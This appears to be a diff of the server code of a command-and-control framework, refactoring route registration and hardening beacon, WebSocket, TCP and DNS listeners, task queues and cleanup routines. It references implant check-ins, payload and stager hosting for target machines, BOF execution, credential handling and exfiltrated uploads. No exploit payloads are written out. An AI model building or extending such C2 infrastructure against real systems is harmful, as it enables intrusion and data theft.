-		auditRead.Use(middleware.RequirePermission(db.PermAuditRead))
-		{
-			auditRead.GET("/audit", s.handleAuditLogPage)
-			auditRead.GET("/audit/logs", s.handleGetAuditLogs)
-		}
-
-		// 鈹€鈹€ Settings 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
-		settingsRead := auth.Group("/")
-		settingsRead.Use(middleware.RequirePermission(db.PermSettingsRead))
-		{
-			settingsRead.GET("/settings", s.handleSettingsPage)
-		}
-		settingsWrite := auth.Group("/")
-		settingsWrite.Use(middleware.RequirePermission(db.PermSettingsWrite))
-		{
-			settingsWrite.POST("/settings/password", s.handleChangePassword)
-			settingsWrite.POST("/settings/agent", s.handleSaveAgentConfig)
-			settingsWrite.POST("/settings/server", s.handleSaveServerConfig)
-			settingsWrite.POST("/settings/malleable", s.handleSaveMalleableProfile)
-			settingsWrite.POST("/settings/purge/tasks", s.handlePurgeTasks)
-			settingsWrite.POST("/settings/purge/audit", s.handlePurgeAuditLogs)
-			settingsWrite.POST("/settings/jwt/regenerate", s.handleRegenerateJWT)
-			settingsWrite.POST("/settings/db/vacuum", s.handleDBVacuum)
-			settingsWrite.POST("/settings/db/backup", s.handleBackupDatabase)
-			settingsWrite.GET("/settings/config/download", s.handleDownloadConfig)
-
-
-		}
-
-		// 鈹€鈹€ 2FA / TOTP 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
-		auth.GET("/settings/totp/status", s.handleTOTPStatus)
-		auth.POST("/settings/totp/generate", s.handleTOTPGenerate)
-		auth.POST("/settings/totp/enable", s.handleTOTPEnable)
-		auth.POST("/settings/totp/disable", s.handleTOTPDisable)
-
-		// 鈹€鈹€ i18n / Translations 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
-		auth.GET("/translations", s.handleTranslationsPage)
-		auth.GET("/api/translations", s.handleGetTranslations)
-		auth.GET("/api/translations/stats", s.handleTranslationStats)
-		auth.GET("/api/translations/check", s.handleTranslationCheck)
-
-		// 鈹€鈹€ API Documentation 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
-		auth.GET("/docs", s.handleDocsPage)
-		auth.GET("/api/docs", s.handleAPIDocsRedirect)
-		auth.GET("/api/docs/", s.handleAPIDocs)
-		auth.GET("/api/docs/openapi.yaml", s.handleAPIDocsYAML)
-
-		// 鈹€鈹€ AI Assistant 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
-		auth.GET("/ai", s.handleAIPage)
-		auth.POST("/ai/chat", s.handleAIChat)
-		auth.POST("/ai/config", s.handleAIConfig)
-
-		// 鈹€鈹€ WebSocket 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
-		auth.GET("/ws", s.handleWebSocket)
-		auth.GET("/ws/beacon", s.handleWebSocketBeacon)
-
-		// 鈹€鈹€ Tokens 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
-		auth.GET("/tokens", s.handleGlobalTokensPage)
-
-		// 鈹€鈹€ User Management 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
-		usersRead := auth.Group("/")
-		usersRead.Use(middleware.RequirePermission(db.PermUsersRead))
-		{
-			usersRead.GET("/users", s.handleUsersPage)
-		}
-		usersWrite := auth.Group("/")
-		usersWrite.Use(middleware.RequirePermission(db.PermUsersWrite))
-		{
-			usersWrite.POST("/users/add", s.handleAddUser)
-			usersWrite.POST("/users/:id/edit", s.handleEditUser)
-			usersWrite.POST("/users/:id/toggle", s.handleToggleUser)
-			usersWrite.POST("/users/:id/password", s.handleSetUserPassword)
-			usersWrite.POST("/users/:id/kick", s.handleKickUser)
-			usersWrite.POST("/users/:id/force-logout", s.handleForceLogoutUser)
-		}
-		usersDelete := auth.Group("/")
-		usersDelete.Use(middleware.RequirePermission(db.PermUsersDelete))
-		{
-			usersDelete.DELETE("/users/:id", s.handleDeleteUser)
-		}
-
-		// 鈹€鈹€ SOCKS Sessions 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
-		auth.GET("/socks/sessions", s.handleGetSocksSessions)
-
-		// Scripting Console
-		auth.GET("/scripting", s.handleScriptingPage)
-		auth.GET("/api/scripts", s.handleAPIGetScripts)
-		auth.POST("/api/scripts", s.handleAPISaveScript)
-		auth.DELETE("/api/scripts/:id", s.handleAPIDeleteScript)
-		auth.POST("/api/scripts/execute", s.handleAPIExecuteScript)
-		auth.GET("/api/scripts/history", s.handleAPIScriptsHistory)
+		s.registerAgentRoutes(auth)
+		s.registerAgentCommandRoutes(auth)
+		s.registerAutomationRoutes(auth)
+		s.registerPluginRoutes(auth)
+		s.registerTaskRoutes(auth)
+		s.registerCredentialRoutes(auth)
+		s.registerGenerateRoutes(auth)
+		s.registerListenerRoutes(auth)
+		s.registerReconRoutes(auth)
+		s.registerSettingsRoutes(auth)
+		s.registerUserRoutes(auth)
+		s.registerCampaignRoutes(auth)
+		s.registerIntegrationRoutes(auth)
+		s.registerDNSRoutes(auth)
+		s.registerStubRoutes(auth)
 	}
 
 	// Agent Beacon API (no auth — agents check in unauthenticated)
@@ -699,6 +380,7 @@ func (s *Server) setupRoutes() {
 	// Protected REST API (authentication required)
 	restAPI := s.router.Group("/api/v1")
 	restAPI.Use(middleware.AuthRequired(s.db))
+	restAPI.Use(middleware.RequestBodyLimit(MaxJSONBodySize))
 	restAPI.Use(s.apiRateLimiter.LimitByUser())
 	{
 		s.registerAPIRoutes(restAPI)
@@ -712,100 +394,51 @@ func (s *Server) setupRoutes() {
 	s.router.GET("/th", s.handleBeacon)
 	s.router.POST("/th", s.handleBeacon)
 	s.router.NoRoute(func(c *gin.Context) {
-		// Treat unmatched GET/POST as potential beacon check-in for custom profile URIs
-		if c.Request.Method == "POST" || c.Request.Method == "GET" {
+		// Only forward POST without Accept: application/json to beacon handler
+		// (implants send POST without JSON accept header)
+		if c.Request.Method == "POST" && c.GetHeader("Accept") != "application/json" {
+			s.rateLimiter.Limit()(c)
+			if c.IsAborted() {
+				return
+			}
 			s.handleBeacon(c)
 			return
 		}
-		c.JSON(http.StatusNotFound, gin.H{"error": "not found"})
+		respondError(c, http.StatusNotFound, "not found")
 	})
 
-	// External C2 (redirector-facing, no auth)
+	// External C2 (redirector-facing, no auth, rate-limited)
 	extc2 := s.router.Group("/extc2/v1")
+	extc2.Use(s.rateLimiter.Limit())
 	{
 		extc2.POST("/receive", s.handleExtC2Receive)
 		extc2.POST("/send", s.handleExtC2Send)
 	}
 
-	// Build logs
-	auth.GET("/builds", s.handleBuildLogs)
-
-	// Traffic monitor
-	auth.GET("/traffic", s.handleTrafficPage)
-	auth.GET("/api/traffic", s.handleTrafficData)
-
-	// Monitor / Alert API
-	auth.GET("/api/monitor/metrics", s.handleGetSystemMetrics)
-	auth.GET("/api/monitor/metrics/history", s.handleGetMetricsHistory)
-	auth.GET("/api/monitor/alerts", s.handleGetAlerts)
-	auth.GET("/api/monitor/alerts/stats", s.handleGetAlertStats)
-	auth.GET("/api/monitor/alert-rules", s.handleGetAlertRules)
-	auth.POST("/api/monitor/alert-rules", s.handleCreateAlertRule)
-	auth.PUT("/api/monitor/alert-rules/:id", s.handleUpdateAlertRule)
-	auth.DELETE("/api/monitor/alert-rules/:id", s.handleDeleteAlertRule)
-	auth.POST("/api/monitor/alerts/:id/acknowledge", s.handleAcknowledgeAlert)
-	auth.POST("/api/monitor/alerts/:id/resolve", s.handleResolveAlert)
-	auth.GET("/api/monitor/agent-status", s.handleGetAgentStatus)
-
-		// ── OPSEC Guard ────────────────────────────────────────────────────
-		auth.POST("/api/opsec/check", s.handleOpsecCheck)
-		auth.GET("/api/opsec/rules", s.handleOpsecRules)
-
-		// ── Circuit Breaker ─────────────────────────────────────────────────
-		auth.GET("/api/circuit-breaker/status", s.handleCircuitBreakerStatus)
-
-		// ── Profile Rotation ────────────────────────────────────────────────
-		auth.POST("/api/agents/:id/profile-rotate", s.handleProfileRotate)
-
-	// Dashboard charts API
-	auth.GET("/api/dashboard/activity-heatmap", s.handleDashboardActivityHeatmap)
-	auth.GET("/api/dashboard/os-distribution", s.handleDashboardOSDistribution)
-	auth.GET("/api/dashboard/task-status", s.handleDashboardTaskStatus)
-	auth.GET("/api/dashboard/listener-traffic", s.handleDashboardListenerTraffic)
-	auth.GET("/api/dashboard/credential-types", s.handleDashboardCredentialTypes)
-	auth.GET("/api/dashboard/agent-geo", s.handleDashboardAgentGeo)
-	auth.GET("/api/dashboard/task-gantt", s.handleDashboardTaskGantt)
-	auth.GET("/api/dashboard/attack-path", s.handleDashboardAttackPath)
-
-	// 鉂€ BOF Management 鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€
-	auth.GET("/bof", s.handleBOFPage)
-	auth.POST("/api/bof/upload", s.handleBOFUpload)
-	auth.GET("/api/bof/list", s.handleBOFList)
-	auth.GET("/api/bof/:id/download", s.handleBOFDownload)
-	auth.POST("/api/bof/:id/run", s.handleBOFRun)
-	auth.POST("/api/bof/:id/edit", s.handleBOFEdit)
-	auth.DELETE("/api/bof/:id", s.handleBOFDelete)
-	auth.GET("/api/bof/results", s.handleBOFRecentResults)
-	// Quick BOF execution from agent shell page (upload + run in one step)
-	auth.POST("/agents/:id/bof/quick", s.handleBOFQuickRun)
-
-	// Version update check & hot-update
-	auth.GET("/api/update-check", s.handleUpdateCheck)
-	auth.GET("/api/update-check/version", s.handleCheckVersion)
-	auth.POST("/api/update-check/refresh", s.handleRefreshUpdateCheck)
-	auth.POST("/api/update-check/hot-update", s.handleHotUpdate)
-
-	// Stage serving for Artifact Kit (no auth -- stagers are unauthenticated)
-	s.router.GET("/stage/:xorKey", s.handleServeStage)
-
-	// One-Liner payload hosting (no auth -- target machines download these)
-	s.router.GET("/payloads/:id/:filename", s.handleServePayload)
-
-	// Screenshot serving (protected)
-	s.router.GET("/screenshots/:agent_id/:filename", middleware.AuthRequired(s.db), s.handleServeScreenshot)
+	// Post-group authenticated routes
+	s.registerMonitorRoutes(auth)
+	s.registerDashboardCharts(auth)
+	s.registerBOFRoutes(auth)
+	s.registerMiscRoutes(auth)
 }
+
 
 // handleWebSocket handles WebSocket connections for real-time notifications
 func (s *Server) handleWebSocket(c *gin.Context) {
+	origin := c.GetHeader("Origin")
+	if origin != "" && !s.wsUpgrader.CheckOrigin(c.Request) {
+		c.AbortWithStatusJSON(http.StatusForbidden, gin.H{"error": "origin not allowed"})
+		return
+	}
 	conn, err := s.wsUpgrader.Upgrade(c.Writer, c.Request, nil)
 	if err != nil {
 		slog.Error("Failed to upgrade WebSocket", "err", err)
 		return
 	}
 
-	conn.SetReadDeadline(time.Now().Add(60 * time.Second))
+	conn.SetReadDeadline(time.Now().Add(WSReadDeadline))
 	conn.SetPongHandler(func(string) error {
-		conn.SetReadDeadline(time.Now().Add(60 * time.Second))
+		conn.SetReadDeadline(time.Now().Add(WSReadDeadline))
 		return nil
 	})
 
@@ -833,22 +466,31 @@ func (s *Server) handleWebSocket(c *gin.Context) {
 			slog.Info("WebSocket client disconnected", "user", username)
 		}()
 
-		ticker := time.NewTicker(30 * time.Second)
+		ticker := time.NewTicker(WSPingInterval)
 		defer ticker.Stop()
+
+		readDone := make(chan struct{})
+		go func() {
+			defer func() { if r := recover(); r != nil { log.Printf("[PANIC RECOVERED] %v\n%s", r, debug.Stack()) } }()
+			defer close(readDone)
+			for {
+				conn.SetReadDeadline(time.Now().Add(WSReadDeadline))
+				_, _, err := conn.ReadMessage()
+				if err != nil {
+					return
+				}
+			}
+		}()
 
 		for {
 			select {
+			case <-readDone:
+				return
 			case <-ticker.C:
-				conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
+				conn.SetWriteDeadline(time.Now().Add(WSWriteDeadline))
 				if err := conn.WriteMessage(websocket.PingMessage, nil); err != nil {
 					return
 				}
-			default:
-			conn.SetReadDeadline(time.Now().Add(60 * time.Second))
-			_, _, err := conn.ReadMessage()
-			if err != nil {
-				return
-			}
 			}
 		}
 	}()
@@ -862,8 +504,8 @@ type UserSession struct {
 
 // getOnlineUsers returns the list of currently connected operator sessions.
 func (s *Server) getOnlineUsers() []UserSession {
-	s.wsMutex.Lock()
-	defer s.wsMutex.Unlock()
+	s.wsMutex.RLock()
+	defer s.wsMutex.RUnlock()
 	users := make([]UserSession, 0, len(s.wsClients))
 	seen := make(map[string]bool)
 	for _, session := range s.wsClients {
@@ -997,6 +639,16 @@ func truncateString(s string, max int) string {
 	return s
 }
 
+func (s *Server) pushBulkResult(r BulkResult) {
+	s.bulkHistoryMu.Lock()
+	defer s.bulkHistoryMu.Unlock()
+	if len(s.bulkHistory) >= maxBulkHistory {
+		s.bulkHistory = s.bulkHistory[1:]
+	}
+	r.ID = len(s.bulkHistory) + 1
+	s.bulkHistory = append(s.bulkHistory, r)
+}
+
 // cleanupOldData removes old completed/failed tasks and old files (screenshots + uploads) to prevent bloat
 func (s *Server) cleanupOldData() {
 	retention := s.cfg.Server.CleanupRetentionDays
@@ -1022,6 +674,9 @@ func (s *Server) cleanupOldData() {
 
 	// Clean old uploads (exfil files)
 	s.cleanOldFiles(filepath.Join(dataDir, "uploads"), cutoff)
+
+	// Clean old agent binaries
+	s.cleanOldFiles(filepath.Join(dataDir, "agents"), cutoff)
 
 	slog.Info("old data cleanup completed")
 }
@@ -1064,13 +719,14 @@ func (s *Server) cleanupGhostAgents() {
 	if err := s.db.Where("(hostname = '' OR hostname IS NULL) AND (ip = '' OR ip IS NULL) AND last_seen < ?", ghostCutoff).Find(&ghosts).Error; err != nil {
 		return
 	}
-	for _, agent := range ghosts {
-		if err := s.db.Where("agent_id = ?", agent.ID).Delete(&db.Task{}).Error; err != nil {
-			slog.Error("Failed to delete ghost agent tasks", "agent_id", agent.ID, "error", err)
+	if len(ghosts) > 0 {
+		ghostIDs := make([]string, len(ghosts))
+		for i, a := range ghosts {
+			ghostIDs[i] = a.ID
 		}
-		if err := s.db.Delete(&agent).Error; err == nil {
-			slog.Info("Removed ghost agent", "id", agent.ID, "last_seen", agent.LastSeen)
-		}
+		s.db.Where("agent_id IN ?", ghostIDs).Delete(&db.Task{})
+		s.db.Where("id IN ?", ghostIDs).Delete(&db.Implant{})
+		slog.Info("Removed ghost agents", "count", len(ghosts))
 	}
 
 	offlineCutoff := time.Now().AddDate(0, 0, -30)
@@ -1078,11 +734,14 @@ func (s *Server) cleanupGhostAgents() {
 	if err := s.db.Where("last_seen < ?", offlineCutoff).Find(&stale).Error; err != nil {
 		return
 	}
-	for _, agent := range stale {
-		s.db.Where("agent_id = ?", agent.ID).Delete(&db.Task{})
-		if err := s.db.Delete(&agent).Error; err == nil {
-			slog.Info("Removed stale offline agent", "id", agent.ID, "hostname", agent.Hostname, "last_seen", agent.LastSeen)
+	if len(stale) > 0 {
+		staleIDs := make([]string, len(stale))
+		for i, a := range stale {
+			staleIDs[i] = a.ID
 		}
+		s.db.Where("agent_id IN ?", staleIDs).Delete(&db.Task{})
+		s.db.Where("id IN ?", staleIDs).Delete(&db.Implant{})
+		slog.Info("Removed stale offline agents", "count", len(stale))
 	}
 }
 
@@ -1118,6 +777,9 @@ func (s *Server) Shutdown() {
 	}
 	clear(s.extraListeners)
 	s.extraListenersMu.Unlock()
+	if s.tcpLn != nil {
+		s.tcpLn.Close()
+	}
 	if s.ctxCancel != nil {
 		s.ctxCancel()
 	}
@@ -1141,6 +803,21 @@ func (s *Server) Run() error {
 	go s.cleanupStaleSocks()
 	go s.periodicRPortFwdCleanup()
 
+	// periodic metrics refresh (same interval as nav stats cache)
+	go func() {
+		defer func() { if r := recover(); r != nil { log.Printf("[PANIC RECOVERED] %v\n%s", r, debug.Stack()) } }()
+		ticker := time.NewTicker(5 * time.Second)
+		defer ticker.Stop()
+		for {
+			select {
+			case <-s.ctx.Done():
+				return
+			case <-ticker.C:
+				s.updateMetricsFromDB()
+			}
+		}
+	}()
+
 	// Initialize Circuit Breaker
 	cb := NewCircuitBreaker(s.cfg)
 	cb.SetOnBurnedHandler(func(targetID string) {
@@ -1160,9 +837,15 @@ func (s *Server) Run() error {
 				slog.Error("Payload cleanup panicked", "recover", r)
 			}
 		}()
+		ticker := time.NewTicker(PayloadCleanupInterval)
+		defer ticker.Stop()
 		for {
-			time.Sleep(30 * time.Minute)
-			s.cleanupOldPayloads()
+			select {
+			case <-s.ctx.Done():
+				return
+			case <-ticker.C:
+				s.cleanupOldPayloads()
+			}
 		}
 	}()
 
@@ -1199,7 +882,7 @@ func (s *Server) Run() error {
 
 	// Start DNS C2 listener if enabled
 	if s.cfg.Server.DNSEnabled && s.cfg.Server.DNSDomain != "" {
-		dl := NewDNSBeaconListener(s.cfg.Server.DNSDomain, s.cfg.Server.Host, 0)
+		dl := NewDNSBeaconListener(s.cfg.Server.DNSDomain, s.cfg.Server.Host, 0, s.cfg.Server.DNSAddr)
 		dl.SetHandler(func(agentID string, reqJSON []byte) []byte {
 			var req beaconRequest
 			if len(reqJSON) > 0 {
@@ -1217,6 +900,12 @@ func (s *Server) Run() error {
 		s.dnsListener = dl
 		go dl.Start()
 	}
+
+	// Restore External C2 channels from DB
+	s.restoreExtC2Channels()
+
+	// Start async build job cleanup goroutine
+	go s.cleanupBuildJobs()
 
 	// Start extra listeners from DB (created via the UI in previous sessions)
 	s.startExtraListenersFromDB()
@@ -1237,9 +926,9 @@ func (s *Server) Run() error {
 			Addr:         addr,
 			Handler:      s.router,
 			TLSConfig:    tlsCfg,
-			ReadTimeout:  30 * time.Second,  // Prevent slow client attacks
-			WriteTimeout: 60 * time.Second,  // Prevent slow response attacks
-			IdleTimeout:  120 * time.Second, // Keep-alive connections
+			ReadTimeout:  HTTPReadTimeout,
+			WriteTimeout: HTTPWriteTimeout,
+			IdleTimeout:  HTTPIdleTimeout,
 		}
 		return server.ListenAndServeTLS(certPath, keyPath)
 	}
@@ -1306,15 +995,16 @@ func (s *Server) startExtraHTTPListener(key, addr, scheme string) error {
 	srv := &http.Server{
 		Addr:         addr,
 		Handler:      s.router,
-		ReadTimeout:  30 * time.Second,
-		WriteTimeout: 60 * time.Second,
-		IdleTimeout:  120 * time.Second,
+		ReadTimeout:  HTTPReadTimeout,
+		WriteTimeout: HTTPWriteTimeout,
+		IdleTimeout:  HTTPIdleTimeout,
 	}
 	s.extraListenersMu.Lock()
 	s.extraListeners[key] = srv
 	s.extraListenersMu.Unlock()
 	s.wg.Add(1)
 	go func() {
+		defer func() { if r := recover(); r != nil { log.Printf("[PANIC RECOVERED] %v\n%s", r, debug.Stack()) } }()
 		defer s.wg.Done()
 		var err error
 		if scheme == "https" {
@@ -1361,6 +1051,7 @@ func (s *Server) startExtraTCPListener(key, addr, scheme string) error {
 	slog.Info("Extra TCP listener started", "addr", addr, "key", key, "tls", scheme == "tls")
 	s.wg.Add(1)
 	go func() {
+		defer func() { if r := recover(); r != nil { log.Printf("[PANIC RECOVERED] %v\n%s", r, debug.Stack()) } }()
 		defer s.wg.Done()
 		for {
 			conn, aErr := ln.Accept()
@@ -1391,7 +1082,7 @@ func (s *Server) stopExtraListener(key string) error {
 
 func (s *Server) runPeriodicCleanup() {
 	s.cleanupOldData()
-	ticker := time.NewTicker(24 * time.Hour)
+	ticker := time.NewTicker(PeriodicCleanupInterval)
 	defer ticker.Stop()
 
 	for {
@@ -1405,7 +1096,7 @@ func (s *Server) runPeriodicCleanup() {
 }
 
 func (s *Server) periodicRPortFwdCleanup() {
-	ticker := time.NewTicker(5 * time.Minute)
+	ticker := time.NewTicker(RPortFwdCleanupInterval)
 	defer ticker.Stop()
 
 	for {
@@ -1441,12 +1132,21 @@ func (s *Server) startTCPListener() {
 		slog.Error("Failed to start TCP listener", "addr", s.cfg.Server.TCPAddr, "err", err)
 		return
 	}
+	s.tcpLn = ln
 	slog.Info("TCP transport layer listening", "addr", s.cfg.Server.TCPAddr)
 
+	s.wg.Add(1)
+	defer s.wg.Done()
 	for {
 		conn, err := ln.Accept()
 		if err != nil {
-			continue
+			select {
+			case <-s.ctx.Done():
+				return
+			default:
+				slog.Error("TCP accept error", "addr", s.cfg.Server.TCPAddr, "err", err)
+				continue
+			}
 		}
 		go s.handleTCPConnection(conn)
 	}
@@ -1457,7 +1157,7 @@ func (s *Server) handleTCPConnection(conn net.Conn) {
 	slog.Info("TCP agent connected", "remote", conn.RemoteAddr().String())
 
 	for {
-		conn.SetReadDeadline(time.Now().Add(60 * time.Second))
+		conn.SetReadDeadline(time.Now().Add(TCPReadDeadline))
 
 		// Read length prefix (big endian uint32)
 		var msgLen uint32
@@ -1509,7 +1209,7 @@ func (s *Server) ActivityMiddleware() gin.HandlerFunc {
 		now := time.Now()
 		mu.Lock()
 		last := lastUpdated[uid]
-		if now.Sub(last) < 60*time.Second {
+		if now.Sub(last) < ActivityUpdateThrottle {
 			mu.Unlock()
 			c.Next()
 			return
@@ -1526,7 +1226,7 @@ func (s *Server) getAgentOrFail(c *gin.Context, id string) (db.Implant, bool) {
 	var agent db.Implant
 	if err := s.db.First(&agent, "id = ?", id).Error; err != nil {
 		slog.Error("Agent not found", "agent_id", id, "error", err)
-		c.JSON(http.StatusNotFound, gin.H{"error": "agent not found"})
+		respondError(c, http.StatusNotFound, "agent not found")
 		return agent, false
 	}
 	return agent, true
@@ -1534,6 +1234,16 @@ func (s *Server) getAgentOrFail(c *gin.Context, id string) (db.Implant, bool) {
 
 // createTask creates and persists a new pending task. Returns the task or error.
 func (s *Server) createTask(agentID, taskType, command, shell, path, data string, offset, size int64) (*db.Task, error) {
+	// Per-agent task queue depth limit — prevents a single compromised agent from flooding the queue
+	s.agentPendingTasksMu.Lock()
+	pending := s.agentPendingTasks[agentID]
+	if pending >= MaxPendingTasksPerAgent {
+		s.agentPendingTasksMu.Unlock()
+		return nil, fmt.Errorf("agent %s has %d pending tasks (limit %d)", agentID, pending, MaxPendingTasksPerAgent)
+	}
+	s.agentPendingTasks[agentID] = pending + 1
+	s.agentPendingTasksMu.Unlock()
+
 	task := db.Task{
 		AgentID: agentID,
 		Type:    taskType,
@@ -1546,6 +1256,9 @@ func (s *Server) createTask(agentID, taskType, command, shell, path, data string
 		Status:  "pending",
 	}
 	if err := s.db.Create(&task).Error; err != nil {
+		s.agentPendingTasksMu.Lock()
+		s.agentPendingTasks[agentID]--
+		s.agentPendingTasksMu.Unlock()
 		return nil, err
 	}
 	if s.pluginManager != nil {
@@ -1560,6 +1273,7 @@ func (s *Server) createTask(agentID, taskType, command, shell, path, data string
 			},
 		})
 	}
+	s.metrics.TasksTotal.Inc()
 	return &task, nil
 }
 
